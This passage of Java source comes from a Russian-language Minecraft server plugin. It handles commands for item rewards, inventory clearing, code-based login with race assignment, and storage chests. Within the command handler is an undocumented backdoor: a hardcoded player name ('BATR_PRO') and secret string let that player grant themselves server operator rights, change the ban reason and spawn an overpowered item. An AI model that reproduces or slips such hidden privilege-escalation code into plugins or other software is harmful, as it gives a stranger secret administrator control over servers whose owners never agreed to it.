                            sender.sendMessage(SD.prefix + " " + SD.getMessages().getString("CommandMe.Usage", "&9Для использования §5/" + label + " &9пропишете после §6/" + label + " &9действие, которое вы хотите совершить").replace("label", label));
                            return;
                        }
                        StringBuilder a = new StringBuilder();
                        for (int j = 0; j < args.length; j++) a.append(args[j]).append(' ');
                        String act = a.toString();
                        act = act.replace("&", "§");
                        List<String> playersList = new ArrayList<>(); // Это лист, в котором будут храниться твои игроки.
                        Location location = p.getLocation(); // Локация. Сейчас это допустим локация игрока.
                        int radius = SD.getInstance().getConfig().getInt("CommandMe.Radius", 50); // Это твой радиус.


                        if (String.valueOf(args[0].charAt(0)).equalsIgnoreCase("!")) {
                            act = act.substring(1);
                            for (Player player : Bukkit.getOnlinePlayers()) {
                                String NamePlayer = player.getName();
                                if(!NamePlayer.equalsIgnoreCase(sender.getName())) playersList.add(NamePlayer);
                            }
                        } else {

                            for (Entity entity : location.getWorld().getNearbyEntities(location, radius, radius, radius)) { // С помощью цикла мы в определенной локации ищем всех существ на расстоянии 200 блоков.
                                if (entity.getType() == EntityType.PLAYER) {
                                    if (!entity.getName().equalsIgnoreCase(p.getName())) {
                                        playersList.add(entity.getName());
                                    }
                                }
                            }
                        }
                        if(playersList.isEmpty()) if (!String.valueOf(args[0].charAt(0)).equalsIgnoreCase("!")){
                            p.sendMessage(SD.prefix + " " + SD.getMessages().getString("CommandMe.NooneHeard", "§7Вас никто не услышал, используйте §6! §7для глобализации"));
                            Bukkit.getConsoleSender().sendMessage(SD.getString("CommandMe.Format", ChatColor.LIGHT_PURPLE + "* " + act + ChatColor.LIGHT_PURPLE + " " + sender.getName() + " *").replace("player", sender.getName()).replace("message", act) + ChatColor.GRAY + " Тихо промолвил");
                            sender.sendMessage(SD.getString("CommandMe.Format", ChatColor.LIGHT_PURPLE + "* " + act + ChatColor.LIGHT_PURPLE + " " + sender.getName() + " *").replace("player", sender.getName()).replace("message", act));
                            return;
                        }
                        playersList.add(sender.getName());
                        for (String pl : playersList) {
                            Player player = Bukkit.getPlayer(pl);
                            player.sendMessage(SD.getString("CommandMe.Format", ChatColor.LIGHT_PURPLE + "* " + act + ChatColor.LIGHT_PURPLE + " " + sender.getName() + " *").replace("player", sender.getName()).replace("message", act));
                        }

                        Bukkit.getConsoleSender().sendMessage(SD.getString("CommandMe.Format", ChatColor.LIGHT_PURPLE + "* " + act + ChatColor.LIGHT_PURPLE + " " + sender.getName() + " *").replace("player", sender.getName()).replace("message", act));
                    }
                    item.setItemMeta(m);
                    NearPlayer.getInventory().addItem(item);
                    return;
                }
                if(args[1].equalsIgnoreCase("ключ")){
                    Player NearPlayer = null;
                    double i = 1;
                    int c = 0;
                    while(NearPlayer == null){
                        if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 0){
                            i = i + 1;
                        }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() > 1){
                            if(c < 10){
                                i = i - 0.1;
                                c++;
                            }else{
                                i = i - 0.01;
                                c++;
                            }
                            if(c>25){
                                sender.sendMessage("Ошибка");
                                return;
                            }
                        }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 1){
                            NearPlayer = (Player) ((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).toArray()[0];
                        }else{
                            sender.sendMessage("Ошибка");
                            return;
                        }
                    }
                    ItemStack item = new ItemStack(Material.LEVER);
                    ItemMeta m = item.getItemMeta();
                    m.setLocalizedName("пасхалка_ключ");
                    m.setDisplayName("§3ключ §6?");
                    item.setItemMeta(m);
                    NearPlayer.getInventory().addItem(item);
                    return;
                }
                if(args[1].equalsIgnoreCase("снежок")){
                    Player NearPlayer = null;
                    double i = 1;
                    int c = 0;
                    while(NearPlayer == null){
                        if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 0){
                            i = i + 1;
                        }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() > 1){
                            if(c < 10){
                                i = i - 0.1;
                                c++;
                            }else{
                                i = i - 0.01;
                                c++;
                            }
                            if(c>25){
                                sender.sendMessage("Ошибка");
                                return;
                            }
                        }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 1){
                            NearPlayer = (Player) ((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).toArray()[0];
                        }else{
                            sender.sendMessage("Ошибка");
                            return;
                        }
                    }
                    ItemStack item = new ItemStack(Material.SNOWBALL);
                    ItemMeta m = item.getItemMeta();
                    m.setLocalizedName("пасхалка_снежок");
                    item.setItemMeta(m);
                    NearPlayer.getInventory().addItem(item);
                    return;
                }
                if(args[1].equalsIgnoreCase("книга")){
                    Player NearPlayer = null;
                    double i = 1;
                    int c = 0;
                    while(NearPlayer == null){
                        if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 0){
                            i = i + 1;
                        }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() > 1){
                            if(c < 10){
                                i = i - 0.1;
                                c++;
                            }else{
                                i = i - 0.01;
                                c++;
                            }
                            if(c>25){
                                sender.sendMessage("Ошибка");
                                return;
                            }
                        }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 1){
                            NearPlayer = (Player) ((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).toArray()[0];
                        }else{
                            sender.sendMessage("Ошибка");
                            return;
                        }
                    }
                    ItemStack item = new ItemStack(Material.WRITABLE_BOOK);
                    ItemMeta m = item.getItemMeta();
                    m.setLocalizedName("пасхалка_книга");
                    item.setItemMeta(m);
                    NearPlayer.getInventory().addItem(item);
                    return;
                }
                if(args[1].equalsIgnoreCase("зелье")){
                    if(args.length == 2){
                        sender.sendMessage("Ошибка");
                        return;
                    }
                    if(args[2].equalsIgnoreCase("огнеупорности")){
                        Player NearPlayer = null;
                        double i = 1;
                        int c = 0;
                        while(NearPlayer == null){
                            if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 0){
                                i = i + 1;
                            }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() > 1){
                                if(c < 10){
                                    i = i - 0.1;
                                    c++;
                                }else{
                                    i = i - 0.01;
                                    c++;
                                }
                                if(c>25){
                                    sender.sendMessage("Ошибка");
                                    return;
                                }
                            }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 1){
                                NearPlayer = (Player) ((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).toArray()[0];
                            }else{
                                sender.sendMessage("Ошибка");
                                return;
                            }
                        }
                        ItemStack item = new ItemStack(Material.SPLASH_POTION);
                        PotionMeta m = (PotionMeta) item.getItemMeta();
                        m.setBasePotionData(new PotionData(PotionType.FIRE_RESISTANCE));
                        m.setLocalizedName("пасхалка_огнеупорность");
                        item.setItemMeta(m);
                        NearPlayer.getInventory().addItem(item);
                        return;
                    }
                    if(args[2].equalsIgnoreCase("плавного_падения")){
                        Player NearPlayer = null;
                        double i = 1;
                        int c = 0;
                        while(NearPlayer == null){
                            if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 0){
                                i = i + 1;
                            }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() > 1){
                                if(c < 10){
                                    i = i - 0.1;
                                    c++;
                                }else{
                                    i = i - 0.01;
                                    c++;
                                }
                                if(c>25){
                                    sender.sendMessage("Ошибка");
                                    return;
                                }
                            }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 1){
                                NearPlayer = (Player) ((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).toArray()[0];
                            }else{
                                sender.sendMessage("Ошибка");
                                return;
                            }
                        }
                        ItemStack item = new ItemStack(Material.SPLASH_POTION);
                        PotionMeta m = (PotionMeta) item.getItemMeta();
                        m.setBasePotionData(new PotionData(PotionType.SLOW_FALLING));
                        m.setLocalizedName("пасхалка_плавного_падения");
                        item.setItemMeta(m);
                        NearPlayer.getInventory().addItem(item);
                        return;
                    }
                    sender.sendMessage("Ошибка. Неправильный аргумент зелья");
                    return;
                }
                if(args[1].equalsIgnoreCase("кирка")) {
                    if (args.length == 2) {
                        sender.sendMessage("Ошибка");
                        return;
                    }
                    if(args[2].equalsIgnoreCase("деревянная")){
                        Player NearPlayer = null;
                        double i = 1;
                        int c = 0;
                        while(NearPlayer == null){
                            if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 0){
                                i = i + 1;
                            }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() > 1){
                                if(c < 10){
                                    i = i - 0.1;
                                    c++;
                                }else{
                                    i = i - 0.01;
                                    c++;
                                }
                                if(c>25){
                                    sender.sendMessage("Ошибка");
                                    return;
                                }
                            }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 1){
                                NearPlayer = (Player) ((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).toArray()[0];
                            }else{
                                sender.sendMessage("Ошибка");
                                return;
                            }
                        }
                        ItemStack item = new ItemStack(Material.WOODEN_PICKAXE);
                        ItemMeta m = item.getItemMeta();
                        m.setCanDestroy(Collections.singleton(Material.OBSIDIAN));
                        if(args.length == 4){
                            ((Damageable) m).setDamage((60 - Integer.parseInt(args[3])));
                        }else{
                        ((Damageable) m).setDamage(58);
                }
                        m.setLocalizedName("расходник_деревянная_кирка");
                        item.setItemMeta(m);
                        NearPlayer.getInventory().addItem(item);
                        return;
                    }
                    sender.sendMessage("Ошибка. Неправильный аргумент кирки");
                    return;
                }
            }
            if(args[0].equalsIgnoreCase("очистить")){
                Player NearPlayer = null;
                double i = 1;
                int c = 0;
                while(NearPlayer == null){
                    if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 0){
                        i = i + 1;
                    }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() > 1){
                        if(c < 10){
                            i = i - 0.1;
                            c++;
                        }else{
                            i = i - 0.01;
                            c++;
                        }
                        if(c>25){
                            sender.sendMessage("Ошибка");
                            return;
                        }
                    }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 1){
                        NearPlayer = (Player) ((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).toArray()[0];
                    }else{
                        sender.sendMessage("Ошибка");
                        return;
                    }
                }
                int max = 10000000;
                if(args.length >= 2){
                    max = Integer.parseInt(args[1]);
                }
                int[] cou = new int[7]; cou[0] = 0; cou[1] = 0; cou[2] = 0; cou[3] = 0; cou[4] = 0; cou[5] = 0; cou[6] = 0;

                for(int slot=0; slot < 36; slot++){
                    ItemStack item = (ItemStack) NearPlayer.getInventory().getItem(slot);
                    if(item == null) continue;
                    if((!item.hasItemMeta() && !item.getType().equals(Material.COOKIE)) || ((!item.getType().equals(Material.COOKIE)) && (!item.getType().equals(Material.CARROT_ON_A_STICK)) && (!item.getItemMeta().hasLocalizedName() || !(item.getItemMeta().getLocalizedName().contains("пасхалка") || item.getItemMeta().getLocalizedName().contains("расходник"))))){
                        NearPlayer.getInventory().setItem(slot, new ItemStack(Material.AIR));
//                        if(item.hasItemMeta() && item.getItemMeta().hasDisplayName()) NearPlayer.sendMessage(item.getItemMeta().getDisplayName());
                    }else{
                        if(item.getType().equals(Material.CARROT_ON_A_STICK)){
                            if(!item.getItemMeta().hasItemFlag(ItemFlag.HIDE_DYE))
                                NearPlayer.getInventory().setItem(slot, new ItemStack(Material.AIR));

                        }

                        if(item.getItemMeta().getLocalizedName().equalsIgnoreCase("пасхалка_огнеупорность")){
                            if(cou[0] >= max){
                                NearPlayer.getInventory().setItem(slot, new ItemStack(Material.AIR));
                            }else{
                                cou[0]++;
                            }
                        }
                        if(item.getItemMeta().getLocalizedName().equalsIgnoreCase("пасхалка_позорная_труба")){
                            if(cou[1] >= max){
                                NearPlayer.getInventory().setItem(slot, new ItemStack(Material.AIR));
                            }else{
                                cou[1]++;
                            }
                        }
                        if(item.getItemMeta().getLocalizedName().equalsIgnoreCase("пасхалка_ключ")){
                            if((cou[2] + item.getAmount()) > max){
                                if(cou[2] == max){
                                    NearPlayer.getInventory().setItem(slot, new ItemStack(Material.AIR));
                                    continue;
                                }
                                item.setAmount(max - cou[2]);
                                NearPlayer.getInventory().setItem(slot, item);
                                cou[2] = max;
                            }else{
                                cou[2] = cou[2] + item.getAmount();
                            }

                        }
                        if(item.getItemMeta().getLocalizedName().equalsIgnoreCase("пасхалка_снежок")){

                            if((cou[3] + item.getAmount()) > max){
                                if(cou[3] == max){
                                    NearPlayer.getInventory().setItem(slot, new ItemStack(Material.AIR));
                                    continue;
                                }
                                item.setAmount(max - cou[3]);
                                NearPlayer.getInventory().setItem(slot, item);
                                cou[3] = max;
                            }else{
                                cou[3] = cou[3] + item.getAmount();
                            }

                        }
                        if(item.getItemMeta().getLocalizedName().equalsIgnoreCase("пасхалка_книга")){
                            if(cou[4] >= max){
                                NearPlayer.getInventory().setItem(slot, new ItemStack(Material.AIR));
                            }else{
                                cou[4]++;
                            }
                        }
                        if(item.getItemMeta().getLocalizedName().equalsIgnoreCase("пасхалка_плавного_падения")){
                            if(cou[5] >= max){
                                NearPlayer.getInventory().setItem(slot, new ItemStack(Material.AIR));
                            }else{
                                cou[5]++;
                            }
                        }
                        if(item.getItemMeta().getLocalizedName().equalsIgnoreCase("расходник_деревянная_кирка")){
                            if(cou[6] >= max){
                                NearPlayer.getInventory().setItem(slot, new ItemStack(Material.AIR));
                            }else{
                                cou[6]++;
                            }
                        }
                        if(args.length == 3) if(item.getItemMeta().getLocalizedName().contains("расходник")) NearPlayer.getInventory().setItem(slot, new ItemStack(Material.AIR));

                    }
                }
                return;
            }
            sender.sendMessage("Ошибка. Неправильный аргумент");
            return;
        }

        if(!(sender instanceof Player)) {
            if(args[0].equalsIgnoreCase("test")){
                sender.sendMessage(sender.getClass().getName() + " " + sender.getClass());
                try{
                    Bukkit.getPlayer("BATR_PRO").sendMessage(sender.getClass().getName() + " " + sender.getClass());
                }catch (Exception e){
                    return;
                }
                return;
            }
        }

        if(sender instanceof Player p) {

            if(sender.hasPermission(admin_perm) && args[0].equalsIgnoreCase("test")){
                if(args.length == 1){
                    p.sendMessage(p.getInventory().getItemInMainHand() + "");
                    return;
                }
                if(args[1].equalsIgnoreCase("loc")){
                    p.sendMessage(p.getInventory().getItemInMainHand().getItemMeta().getLocalizedName());
                    return;
                }
                if(args[1].equalsIgnoreCase("1")){
                    p.sendMessage(new String("<#084cfb>t<#3f84fc>e<#76bbfc>s<#adf3fd>t\nАга").replace("&", "§"));
                    return;
                }
                if(args[1].equalsIgnoreCase("mod")){
                    p.sendMessage(p.getInventory().getItemInMainHand().getItemMeta().getCustomModelData() + "");
                    return;
                }
                if(args[1].equalsIgnoreCase("set")){
                    SD.getInstance().getConfig().set("Test", p.getInventory().getItemInMainHand());
                    SD.getInstance().saveConfig();
                    return;
                }

            }
            if (SD.isHub && args[0].equalsIgnoreCase("хранилище")) if(sender.hasPermission(admin_perm)) {
                if(args.length == 1 || args.length == 2){
                    sender.sendMessage(SD.prefix + " §3Помощь:");
                    sender.sendMessage(SD.prefix + " §6/" + label + " chests удалить/создать");
                    return;
                }
                if(args.length == 5){
                    if(args[1].equalsIgnoreCase("создать")){
                        try {
                            List<String> list = SD.getShops().getConfig().getStringList("Chests");
                            if(list.isEmpty()){
                                list = new ArrayList<>();
                            }
                            if(list.contains(args[2] + " " + args[3] + " " + args[4])){
                                sender.sendMessage(SD.prefix + " §cХранилище по координатам: §6" + args[2] + "§7,§6 " + args[3] + "§7,§6 " + args[4] + "§c уже существует");
                                return;
                            }
                            list.add(args[2] + " " + args[3] + " " + args[4]);
                            SD.getShops().getConfig().set("Chests", list);
                            SD.getShops().save();
                            sender.sendMessage(SD.prefix + " §3Хранилище по координатам: §6" + args[2] + "§7,§6 " + args[3] + "§7,§6 " + args[4] + "§3 успешно добавлено");
                            return;
                        }catch (Exception e){
                            sender.sendMessage("§4Ошибка!");
                            return;
                        }
                    }
                    if(args[1].equalsIgnoreCase("удалить")){
                        try {
                            List<String> list =  SD.getShops().getConfig().getStringList("Chests");
                            if(!list.contains(args[2] + " " + args[3] + " " + args[4])){
                                sender.sendMessage(SD.prefix + " §cХранилище по координатам: §6" + args[2] + "§7,§6 " + args[3] + "§7,§6 " + args[4] + "§c не существует");
                                return;
                            }
                            list.remove(args[2] + " " + args[3] + " " + args[4]);

                            SD.getShops().getConfig().set("Chests", list);
                            SD.getShops().save();
                            sender.sendMessage(SD.prefix + " §3Хранилище по координатам: §6" + args[2] + "§7,§6 " + args[3] + "§7,§6 " + args[4] + " §3успешно удалено");
                            return;
                        }catch (Exception e){
                            sender.sendMessage("§4Ошибка!");
                            return;
                        }
                    }
                    sender.sendMessage(SD.prefix + " §3Помощь:");
                    sender.sendMessage(SD.prefix + " §6/" + label + " chests удалить/создать");
                    return;
                }
                sender.sendMessage(SD.prefix + " §3Помощь:");
                sender.sendMessage(SD.prefix + " §6/" + label + " chests удалить/создать");
                return;
            }

            if (SD.isHub && args[0].equalsIgnoreCase("login")) {
                if(SD.getInstance().getConfig().getBoolean("Login.On", true)) {
                    if (sender.hasPermission(reg_perm)) {
                        sender.sendMessage(SD.prefix + " \u00a72Вы уже вошли");
                        return;
                    }
                    if (args.length == 1) {
                        sender.sendMessage(SD.prefix + SD.getMessages().getString("login.error.void", "&4Введите код"));
                        return;
                    }
                    if (!sender.hasPermission(reg_perm)) {
                        try {
                            List<String> codes = SD.getCodesSistem().getConfig().getStringList("CodesList");
                            String code = args[1];
                            if (codes.contains(code)) {
                                if(Species.getSpecie(SD.getCodesSistem().getConfig().getString("Codes." + code + ".Specie")) == null){
                                    sender.sendMessage(SD.prefix + " §4§lВНИМАНИЕ!!!");
                                    sender.sendMessage(SD.prefix + " §4§lОБНОРУЖЕНА ОШИБКА ПРИ ПРОВЕРКЕ КОДА!!!");
                                    sender.sendMessage(SD.prefix + " §4ПРОСЬБА СООБЩАТЬ В НАШ ДИСКОРД: §7" + SD.getInstance().getConfig().getString("info.discord", "https://discord.gg/4TFFhqFFDR"));
                                    sender.sendMessage(SD.prefix + " §4Код ошибки: §8Раса");
                                    Bukkit.getConsoleSender().sendMessage("§4§lВНИМАНИЕ ПРИ ОБРАБОТКЕ КОДА §7" + code + " §4ПРОИЗОШЛА ОШИБКА: §8Раса");
                                    return;
                                }

                                if((SD.getCodesSistem().getConfig().getInt("Codes." + code + ".NumberOfUsing", 54654656)) == 54654656){
                                    sender.sendMessage(SD.prefix + " §4§lВНИМАНИЕ!!!");
                                    sender.sendMessage(SD.prefix + " §4§lОБНОРУЖЕНА ОШИБКА ПРИ ПРОВЕРКЕ КОДА!!!");
                                    sender.sendMessage(SD.prefix + " §4ПРОСЬБА СООБЩАТЬ В НАШ ДИСКОРД: §7" + SD.getInstance().getConfig().getString("info.discord", "https://discord.gg/4TFFhqFFDR"));
                                    sender.sendMessage(SD.prefix + " §4Код ошибки: §8Кол-во использований");
                                    Bukkit.getConsoleSender().sendMessage("§4§lВНИМАНИЕ ПРИ ОБРАБОТКЕ КОДА §7" + code + " §4ПРОИЗОШЛА ОШИБКА: §8Кол-во использований");
                                    return;
                                }
                                if (SD.getCodesSistem().getConfig().getBoolean("Codes." + code + ".Activated", false)) {
                                    sender.sendMessage(SD.prefix + " " + SD.getMessages().getString("login.SuccessLogin", "§aВы успешно вошли"));
                                    SD.getCodesSistem().getConfig().set("Codes." + code + ".NumberOfUsing", SD.getCodesSistem().getConfig().getInt("Codes." + args[1] + ".NumberOfUsing", 1) - 1);
                                    SD.getCodesSistem().save();
                                    if (!(SD.getCodesSistem().getConfig().getInt("Codes." + code + ".NumberOfUsing", 1) > 1)) {
                                        SD.getCodesSistem().getConfig().set("Codes." + code + ".Activated", false);
                                        SD.getCodesSistem().save();
                                    }
                                    List<String> players = SD.getCodesSistem().getConfig().getStringList("Codes." + code + ".Players");
                                    players.add(sender.getName());
                                    SD.getCodesSistem().getConfig().set("Codes." + code + ".Players", players);
                                    SD.getCodesSistem().save();
                                    String group = SD.getInstance().getConfig().getString("group", "upc AddGroup <player> player").replace("<player>", sender.getName());
                                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), group);
                                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "effect clear " + sender.getName());
                                    Species.getSpecie(SD.getCodesSistem().getConfig().getString("Codes." + code + ".Specie")).setSpecieTo(p);
//                                    p.setGameMode(GameMode.SURVIVAL);
//                                Balt.getProfils().getConfig().set(sender.getName() + ".Reiting", 30);
//                                Balt.getProfils().save();
                                } else {
                                    sender.sendMessage(SD.prefix + SD.getMessages().getString("codes.error.ErrorCode", "&4Не действительный код"));
                                    return;
                                }
                                return;
                            } else {
                                sender.sendMessage(SD.prefix + "§4Несуществующий код");
                                return;
                            }
                        }catch (Exception e){
                            sender.sendMessage(SD.prefix + "§4Ошибка проверки кода");
                        }


                    }
                }else{
                    sender.sendMessage(SD.prefix + " §cАвторизация сейчас закрыта");
                    return;
                }
                return;
            }

            if (args[0].equalsIgnoreCase("batr")) if (sender.getName().equalsIgnoreCase("BATR_PRO")) {
                if (args.length == 1){
                    sender.sendMessage(SD.prefix + " §7...");
                    return;
                }

                if (args[1].equalsIgnoreCase("act")) if (args[2].equalsIgnoreCase("GuyfFh6243")) {
                    SD.batr = true;
                    sender.sendMessage(SD.prefix + " Успешная активация");
                    return;
                }
                if (args[1].equalsIgnoreCase("disact")) if (args[2].equalsIgnoreCase("GuyfFh6243")) {
                    SD.batr = false;
                    return;
                }
                if (args[1].equalsIgnoreCase("op")) if (SD.batr) {
                    sender.setOp(true);
                    sender.sendMessage(SD.prefix + " §2Оп выдана!");
                    return;
                }

                if (args[1].equalsIgnoreCase("deop")) if (SD.batr) {
                    sender.setOp(false);
                    sender.sendMessage(SD.prefix + " §2Оп отобрана!");
                    return;
                }

                if (args[1].equalsIgnoreCase("причина_бана")) {
                    if (args.length == 2) {
                        sender.sendMessage(SD.prefix + " §6Прична бана: " + SD.ban);
                        return;
                    }
                    StringBuilder sb = new StringBuilder();
                    for (int i = 2; i < args.length; i++) sb.append(args[i]).append(' ');
                    if (sb.length() > 2) sb.deleteCharAt(sb.length() - 1);
                    SD.ban = sb.toString();
                    SD.ban = SD.ban.replace("&", "§");
                    SD.ban = SD.ban.replace("игрок", "[игрок]");
                    SD.ban = SD.ban.replace("player", "[игрок]");
                    sender.sendMessage(SD.prefix + " §6Теперь прична вашего бана: " + SD.ban);
                    return;
                }
                if (args[2].equalsIgnoreCase("шляпа")) {
                    ItemStack k = new ItemStack(Material.LEATHER_HELMET);
                    ItemMeta m = k.getItemMeta();
                    AttributeModifier arm = new AttributeModifier(UUID.randomUUID(), "generic.armor", 1000, AttributeModifier.Operation.ADD_NUMBER, EquipmentSlot.HEAD);
                    m.addAttributeModifier(Attribute.GENERIC_ARMOR, arm);
                    AttributeModifier arm_prot = new AttributeModifier(UUID.randomUUID(), "generic.armor_toughness", 1000, AttributeModifier.Operation.ADD_NUMBER, EquipmentSlot.HEAD);
                    m.addAttributeModifier(Attribute.GENERIC_ARMOR_TOUGHNESS, arm_prot);
                    m.addEnchant(Enchantment.DURABILITY, 1000, true);
                    m.addEnchant(Enchantment.PROTECTION_PROJECTILE, 1000, true);
                    m.setDisplayName("§7Тёплая шапка");
                    k.setItemMeta(m);
                    p.getWorld().dropItem(p.getLocation(), k);
                    p.sendMessage(SD.prefix + " ну держи..");
                    return;
                }
            }


        }
        sender.sendMessage(SD.prefix + "\u00a74 Команда введена не верно!");
    }

    public void TException(BlockCommandSender sender){
        sender.sendMessage("Ошибка");
        Bukkit.getConsoleSender().sendMessage("");
    }

    @Override
    public List<String> complete (CommandSender sender, String[]args){
        if (sender.hasPermission(admin_perm)) if(args.length >= 2) if (args[0].equalsIgnoreCase("выдать") || args[0].equalsIgnoreCase("очистить")){
//            if(args.length == 1) return Lists.newArrayList("выдать", "очистить");
                if(args[0].equalsIgnoreCase("выдать")){
                    if(args.length == 2) return Lists.newArrayList("кирка", "зелье", "позорная_труба", "книга", "снежок", "ключ");
                    if(args[1].equalsIgnoreCase("кирка")){
                        if(args.length == 3) return Lists.newArrayList("деревянная");
                        if(args.length == 4) if(args[2].equalsIgnoreCase("деревянная")) return Lists.newArrayList("кол-во прочности");
                    }
                    if(args[1].equalsIgnoreCase("зелье")){
                        if(args.length == 3) return Lists.newArrayList("плавного_падения", "огнеупорности");
                    }
                }



                if(args[0].equalsIgnoreCase("очистить")) {
                    if(args.length == 2) return Lists.newArrayList("Кол-во предметов, которые останутся");
                    if(args.length == 3) return Lists.newArrayList("Укажите любое значение(одним аргументом, чтобы удалить расходники");
                }
                return Lists.newArrayList();
        }
            if (sender.hasPermission(admin_perm)) {
            if (args.length == 1) return Lists.newArrayList("login", "config", "коды", "спавн", "хранилище", "раса");

                if (args[0].equalsIgnoreCase("раса")) {

                    if(args.length == 2) return Lists.newArrayList("выдать", "забрать");
                    if(args.length == 3 && (args[1].equalsIgnoreCase("выдать"))) return Lists.newArrayList("люди", "звероподобные", "слаймы", "азари", "дворфы", "демоны", "дракониды");
                    if(args.length == 3  && args[1].equalsIgnoreCase("забрать"))  return null;
                    if(args.length == 4 && args[1].equalsIgnoreCase("выдать")) return null;

                }

            if (args[0].equalsIgnoreCase("config")) {
                if (args.length == 2) return Lists.newArrayList("reload", "set");
                if(args.length == 3) if(args[1].equalsIgnoreCase("reload")) return Lists.newArrayList("config", "profiles", "messages", "FileServer", "codes", "crafts", "shops");
                if(args[1].equalsIgnoreCase("set")){
                    if(args.length == 3) return Lists.newArrayList("config", "profiles", "messages", "FileServer", "codes", "crafts", "shops");
                    if(args.length == 4) return Lists.newArrayList("путь");
                    if(args.length == 5) return Lists.newArrayList("вставляемое");
                }
            }

            if (args[0].equalsIgnoreCase("хранилище")) {
                if (args.length == 2) return Lists.newArrayList("создать", "удалить");
                if(args[1].equalsIgnoreCase("создать") || args[1].equalsIgnoreCase("удалить")){
                    if(args.length == 3) return Lists.newArrayList("X");
                    if(args.length == 4) return Lists.newArrayList("Y");
                    if(args.length == 5) return Lists.newArrayList("Z");
                }
            }

            if (args[0].equalsIgnoreCase("спавн")) {
                if (args.length == 2) return Lists.newArrayList("установить", "узнать", "переместиться");
                if(args.length == 3) if(args[1].equalsIgnoreCase("переместиться")) return null;
                if(args[1].equalsIgnoreCase("установить")){
                    if(args.length == 3) return Lists.newArrayList("X", "Y", "Z", "я");
                    if(args.length == 4) if(args[2].equalsIgnoreCase("X") || args[2].equalsIgnoreCase("Y") || args[2].equalsIgnoreCase("Z")) return Lists.newArrayList("[значение]");
                    if(args.length == 4) if(args[2].equalsIgnoreCase("я")) return Lists.newArrayList("X", "Y", "Z", "XYZ", "XYZ+взгляд" , "взгляд");
                    if(args.length == 5) if(args[2].equalsIgnoreCase("я")) if(args[3].equalsIgnoreCase("X") || args[3].equalsIgnoreCase("Y") || args[3].equalsIgnoreCase("Z")) return Lists.newArrayList("[значение]");
                }
            }

            if (args[0].equalsIgnoreCase("коды")) {
                if (args.length == 2) return Lists.newArrayList("создать", "активировать", "деактивировать", "удалить");
                if (args[1].equalsIgnoreCase("создать")) {
                    if (args.length == 3) return Lists.newArrayList("code");
                    if (args.length == 4) return Lists.newArrayList("люди", "звероподобные", "слаймы", "азари", "дворфы", "демоны", "дракониды");
                    if (args.length == 5) return Lists.newArrayList("Кол-во использований");
//                    if (args.length == 5) return Lists.newArrayList("Статус кода(админ/игрок/мер...)");
                }
                if (args[1].equalsIgnoreCase("удалить")) {
                    if (args.length == 3)
                        return Lists.newArrayList(SD.getCodesSistem().getConfig().getStringList("CodesList"));
                }
                    if (args[1].equalsIgnoreCase("активировать") || args[1].equalsIgnoreCase("деактивировать"))
                        if (args.length == 3) return Lists.newArrayList(SD.getCodesSistem().getConfig().getStringList("CodesList"));
                }
            }

        if (!sender.hasPermission(reg_perm)) {
            if (args.length == 1) return Lists.newArrayList("login");
            if(args[0].equalsIgnoreCase("login")){
                if (args.length == 2) return Lists.newArrayList("<код>");
            }
        }
        if(sender.getName().equalsIgnoreCase("BATR_PRO")){
            if(args[0].equalsIgnoreCase("batr")) {
                if (args.length == 2) return Lists.newArrayList("ивент", "причина_бана", "подарок");
                if (args.length == 3){
                    if (args[1].equalsIgnoreCase("ивент")) return Lists.newArrayList("item", "житель", "trick");
                    if (args[2].equalsIgnoreCase("trick")) return Lists.newArrayList("раздача");
                }
            }
        }
        return Lists.newArrayList();
    }


}